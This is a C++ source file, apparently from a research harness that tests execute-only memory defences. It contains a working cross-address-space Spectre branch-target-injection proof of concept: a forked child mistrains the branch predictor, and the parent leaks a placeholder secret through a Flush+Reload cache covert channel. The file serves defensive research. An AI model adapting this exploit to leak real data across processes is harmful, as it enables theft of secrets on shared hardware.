#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sched.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <poll.h>
#include <sys/prctl.h>
#include <linux/prctl.h>

#include "microarchitecture.h"
#include "libxom.h"

extern "C" {
#include "libcache/cacheutils.h"

  struct xombuf {
    void* address;
    size_t allocated_size;
    uint8_t locked;
  } typedef _xombuf, *p_xombuf;
}

#define SECRET 'S'

// Base class
class Animal {
public:
  virtual void move() {
  }
};

// Bird contains the secret
class Bird : public Animal {
private:
    uint8_t padding1;
    char secret;
    uint8_t padding2[PAGE_SIZE - 2];
public:
  Bird() : padding1(0xc3), secret(SECRET) {
    padding2[0] = 0xc3;
  }

  char* secret_fun() {
    return &secret;
  }

  void move() {
     // nop
  }
};

// Class that contains the function to leak data
class Fish : public Animal {
private:
  uint8_t padding1;
  char data;
  uint8_t padding2[PAGE_SIZE - 2];
public:
  Fish() {
    data = 'F';
  }
  void move() {
    //Encode data in the cache
    cache_encode(data);
  }
};

// Function so that we always call animal->move from the same virtual address
// required for indexing always the same BTB entry
void move_animal(Animal* animal) {
  animal->move();
}

static uint8_t spectre_btb_ca_test_fun_generic(const attack_test & config, bool xom) {
  xombuf* xbuf;
  int pipefd[2], counter = 0, success_counter = 0, wait_status = 0;
  if(pipe(pipefd) < 0)
      return ~0;
  pollfd pipepoll = {pipefd[0],POLLIN | POLLPRI | POLLERR | POLLHUP | POLLNVAL, 0};

  // Detect cache threshold
  if(!CACHE_MISS)
    CACHE_MISS = detect_flush_reload_threshold();
  printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);
  printf("Works if %c appears\n", SECRET);

  pagesize = sysconf(_SC_PAGESIZE);
  char* _mem = (char*)malloc(pagesize*300);
  mem = (char*)(((size_t)_mem & ~(pagesize-1)) + pagesize*2);

  // Cross-address-space attack, so we fork
  int is_child = (fork() == 0);
  if(is_child)
    prctl(PR_SET_PDEATHSIG, SIGHUP);

  Fish* fish = new Fish();
  Bird* bird = new Bird(); // contains secret

  xbuf = xom_alloc_pages(PAGE_SIZE);
  mmap(static_cast<uint8_t *>(xbuf->address) + PAGE_SIZE, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
  mmap(static_cast<uint8_t *>(xbuf->address) - PAGE_SIZE, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
  // Copy Bird into new buffer so that the vtable pointers are readable, but the stack section is not
  memcpy(&static_cast<uint8_t *>(xbuf->address)[-sizeof(void*)], bird, sizeof(*bird));
  delete bird;
  bird = (Bird*) &static_cast<uint8_t *>(xbuf->address)[-sizeof(void*)];

  if(xom)
    xom_lock(xbuf);
  else
    mprotect(xbuf->address, PAGE_SIZE, PROT_EXEC | PROT_WRITE | PROT_READ);

  // Make sure that secret lies in executable memory region
  (reinterpret_cast<void(*)()>(bird->secret_fun() - 1))();
  (reinterpret_cast<void(*)()>(bird->secret_fun() + 1))();
  bird->move();

  char* ptr = (char*)((((size_t)move_animal)) & ~(pagesize-1));
  mprotect(ptr, pagesize * 2, PROT_WRITE | PROT_READ | PROT_EXEC);

  memset(mem, 0, pagesize * 290);
  maccess((void*)move_animal);

  // trigger COW for the page containing the function
  ptr[0] = ptr[0];

  while(1) {
    // Child is doing the mistraining
    if(is_child) {
      if(poll(&pipepoll, 1, 0))
        exit(0);
      nospec();
      // train for fish
      for(int j = 0; j < 1000; j++) {
        move_animal(fish);
      }
    }
    // Flush our shared memory
    flush_shared_memory();
    mfence();

    // We cannot flush because SLAT XOM faults
    // on clflush
    // flush(bird);
    // mfence();

    // Parent is leaking data
    if(!is_child) {
      if(counter >= config.num_samples) {
        write(pipefd[1], static_cast<const char*>("."), sizeof("."));
        wait(&wait_status);
        delete fish;
        munmap(static_cast<uint8_t *>(xbuf->address) + PAGE_SIZE, PAGE_SIZE);
        munmap(static_cast<uint8_t *>(xbuf->address) - PAGE_SIZE, PAGE_SIZE);
        xom_free(xbuf);

        return success_counter > (config.num_samples / config.success_fraction) ?
              static_cast<uint8_t>(1) : static_cast<uint8_t>(0);
      }
      nospec();
      // Leak bird secret
      move_animal(bird);

      // Recover data from the covert channel
      for(int i = 1; i < 256; i++) {
        int mix_i = ((i * 167) + 13) & 255; // prefetcher
        if(flush_reload(mem + mix_i * pagesize)) {
           if((mix_i >= 'A' && mix_i <= 'Z')) {
             printf("%c ", mix_i);
           }
          if(mix_i == SECRET)
            success_counter++;
          counter++;
          fflush(stdout);
          sched_yield();
        }
      }
    }
  }
}

static attack_status spectre_btb_ca_test_fun(const attack_test & config) {
    uint8_t noxom = spectre_btb_ca_test_fun_generic(config, false),
        xom = 0;//spectre_btb_ca_test_fun_generic(config, true);

    if(!~noxom || !~xom)
      return {{0, 0, 1}};
    return {{noxom, xom, 0}};
}


attack_test spectre_btb_ca = {
  spectre_btb_ca_test_fun,
  "spectre-btb-ca",
  "spectre",
  1,
  100,
  5
};
